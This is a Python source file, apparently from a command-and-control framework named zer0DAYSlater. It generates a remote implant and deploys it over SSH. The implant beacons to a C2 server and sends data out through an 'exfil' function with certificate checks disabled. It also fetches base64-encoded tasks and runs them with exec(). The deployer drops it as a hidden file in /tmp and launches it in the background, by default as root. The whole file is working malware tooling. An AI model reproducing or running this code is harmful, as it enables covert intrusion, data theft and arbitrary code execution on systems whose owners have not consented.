#!/usr/bin/env python3
"""
zer0DAYSlater — Agent Deployer
Packages and deploys agent_core to a remote target via SSH.
Requires: ssh access to target, Python 3.10+ on target.

Usage:
    python3 tools/agent_deploy.py <target_ip> [--user USER] [--port PORT] [--key KEY]
"""
from __future__ import annotations
import argparse
import os
import subprocess
import sys
import tempfile
import textwrap
from pathlib import Path

ZDS_ROOT = Path(__file__).parent.parent


def build_agent_bundle(c2_ws_url: str, c2_https: str, auth_token: str) -> str:
    """Build a self-contained agent script."""
    bundle = textwrap.dedent(f"""
#!/usr/bin/env python3
# zer0DAYSlater agent bundle — auto-generated
import os
os.environ.setdefault("ZDS_C2_WS_URL",       "{c2_ws_url}")
os.environ.setdefault("ZDS_HTTPS_ENDPOINT",  "{c2_https}")
os.environ.setdefault("ZDS_AUTH_TOKEN",      "{auth_token}")
os.environ.setdefault("ZDS_PLUGIN_SERVER",   "{c2_https}")

import base64, json, random, time, uuid, threading, asyncio, sys

AGENT_ID = str(uuid.uuid4())[:8]
C2_WS    = os.environ["ZDS_C2_WS_URL"]
C2_HTTP  = os.environ["ZDS_HTTPS_ENDPOINT"]
TOKEN    = os.environ["ZDS_AUTH_TOKEN"]

def jitter():
    time.sleep(random.uniform(8, 15))

def exfil(data):
    try:
        import urllib.request, ssl
        url = f"{{C2_HTTP}}/data/{{AGENT_ID}}"
        req = urllib.request.Request(
            url,
            data=json.dumps({{"agent_id": AGENT_ID, "data": data}}).encode(),
            headers={{"Content-Type": "application/json", "X-Token": TOKEN}},
            method="POST",
        )
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        urllib.request.urlopen(req, context=ctx, timeout=5)
        return True
    except Exception as e:
        print(f"[agent] exfil failed: {{e}}")
        return False

def poll_task():
    try:
        import urllib.request, ssl
        url = f"{{C2_HTTP}}/task/{{AGENT_ID}}"
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(url, context=ctx, timeout=5)
        data = json.loads(resp.read())
        return data.get("payload")
    except Exception:
        return None

def run():
    print(f"[agent] {{AGENT_ID}} started — C2: {{C2_HTTP}}")
    exfil({{"status": "online", "agent_id": AGENT_ID}})
    while True:
        try:
            task = poll_task()
            if task:
                print(f"[agent] task received")
                exec(base64.b64decode(task).decode())
            jitter()
        except Exception as e:
            print(f"[agent] error: {{e}}")
            time.sleep(30)

if __name__ == "__main__":
    run()
""").strip()
    return bundle


def deploy(target_ip: str, user: str, port: int, key: str | None):
    c2_ws    = os.environ.get("ZDS_C2_WS_URL", f"wss://{os.environ.get('ZDS_HTTPS_ENDPOINT', '').replace('https://','').split('/')[0]}")
    c2_https = os.environ.get("ZDS_HTTPS_ENDPOINT", "")
    token    = os.environ.get("ZDS_AUTH_TOKEN", "")

    if not c2_https or not token:
        print("[!] ZDS_HTTPS_ENDPOINT and ZDS_AUTH_TOKEN must be set")
        sys.exit(1)

    print(f"[*] Building agent bundle...")
    bundle = build_agent_bundle(c2_ws, c2_https, token)

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(bundle)
        tmp_path = f.name

    ssh_opts = ["-o", "StrictHostKeyChecking=no", "-p", str(port)]
    if key:
        ssh_opts += ["-i", key]

    remote_path = "/tmp/.zds_agent.py"

    print(f"[*] Deploying to {user}@{target_ip}:{port}...")
    scp_cmd = ["scp"] + ssh_opts + [tmp_path, f"{user}@{target_ip}:{remote_path}"]
    result = subprocess.run(scp_cmd, capture_output=True)
    if result.returncode != 0:
        print(f"[!] SCP failed: {result.stderr.decode()}")
        os.unlink(tmp_path)
        sys.exit(1)

    print(f"[*] Starting agent on {target_ip}...")
    ssh_cmd = ["ssh"] + ssh_opts + [
        f"{user}@{target_ip}",
        f"nohup python3 {remote_path} > /tmp/.zds.log 2>&1 &"
    ]
    result = subprocess.run(ssh_cmd, capture_output=True)
    os.unlink(tmp_path)

    if result.returncode != 0:
        print(f"[!] SSH failed: {result.stderr.decode()}")
        sys.exit(1)

    print(f"[+] Agent deployed to {target_ip}")
    print(f"    log: {target_ip}:/tmp/.zds.log")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="zer0DAYSlater agent deployer")
    parser.add_argument("target",          help="Target IP address")
    parser.add_argument("--user", "-u",    default="root",  help="SSH user")
    parser.add_argument("--port", "-p",    type=int, default=22, help="SSH port")
    parser.add_argument("--key",  "-k",    default=None,    help="SSH key file")
    args = parser.parse_args()
    deploy(args.target, args.user, args.port, args.key)
